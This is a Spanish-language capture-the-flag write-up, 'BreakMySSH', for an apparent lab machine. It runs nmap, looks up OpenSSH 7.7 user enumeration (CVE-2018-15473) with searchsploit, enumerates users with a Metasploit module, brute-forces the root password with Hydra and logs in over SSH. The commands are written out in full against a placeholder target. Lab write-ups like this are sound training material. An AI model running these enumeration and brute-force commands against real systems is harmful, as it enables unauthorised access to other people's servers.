# BreakMySSH
## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultado Clave:**

*   `22/tcp open ssh OpenSSH 7.7 (protocol 2.0)`: El puerto 22 está abierto y ejecuta OpenSSH versión 7.7.

## 2. Enumeración de Usuarios SSH

La versión de OpenSSH (7.7) es conocida por ser vulnerable a la enumeración de usuarios (CVE-2018-15473). Esto significa que un atacante puede determinar si un nombre de usuario existe en el sistema sin necesidad de credenciales válidas.

### 2.1. Búsqueda de Exploits con Searchsploit

Utilizamos `searchsploit` para buscar exploits públicos relacionados con OpenSSH 7.7. Esto nos confirma la existencia de vulnerabilidades de enumeración de usuarios.

```bash
searchsploit OpenSSH 7.7
```

**Resultados**

```bash
Exploit Title                                               |  Path  
------------------------------------------------------------- ---------------------------------  
OpenSSH 2.3 < 7.7 - Username Enumeration                     | linux/remote/45233.py  
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)               | linux/remote/45210.py  
OpenSSH < 7.7 - User Enumeration (2)                         | linux/remote/45939.py  
------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results
```

### 2.2. Enumeración con Metasploit

Metasploit Framework ofrece un módulo (`auxiliary/scanner/ssh/ssh_enumusers`) que explota esta vulnerabilidad para enumerar usuarios. Iniciamos `msfconsole` y configuramos el módulo.

```bash
sudo msfdb init && msfconsole
# search OpenSSH
# use auxiliary/scanner/ssh/ssh_enumusers
# options
# set RHOSTS <IP_DEL_OBJETIVO>
# set USER_FILE /path/to/wordlist/users.txt  # Usar un diccionario de usuarios comunes
# run
```

**Usuarios Encontrados:**

El módulo de Metasploit identifica varios usuarios, incluyendo cuentas de sistema (`_apt`, `backup`, `bin`, `daemon`, etc.) y, lo más importante, el usuario `root`. 
## 3. Ataque de Fuerza Bruta SSH

Una vez que tenemos una lista de usuarios válidos, podemos intentar un ataque de fuerza bruta para adivinar sus contraseñas. Nos enfocaremos en el usuario `root`.

### 3.1. Fuerza Bruta con Hydra

```bash
hydra -l root -P /path/to/wordlist/passwords.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado Clave:**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: root password: estrella`

Esto nos proporciona la contraseña para el usuario `root`: **estrella**.

## 4. Acceso SSH y Manejo de Claves de Host

Con el usuario `root` y su contraseña, intentamos acceder al servidor SSH.

### 4.1. Conexión SSH

```bash
ssh root@<IP_DEL_OBJETIVO>
```

**Error Común:**

Es posible que aparezca un mensaje de advertencia como "`WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`". Esto ocurre si la clave de host del servidor ha cambiado desde la última vez que nos conectamos a esa IP. Para resolverlo, debemos eliminar la entrada antigua de la clave de host de nuestro archivo `known_hosts`.

```bash
ssh-keygen -f "/home/user/.ssh/known_hosts" -R "<IP_DEL_OBJETIVO>"
```

Después de eliminar la entrada, intentamos la conexión SSH nuevamente.

### 4.2. Verificación de Acceso

Una vez conectados, confirmamos que hemos iniciado sesión como `root`.

```bash
whoami
# root
```
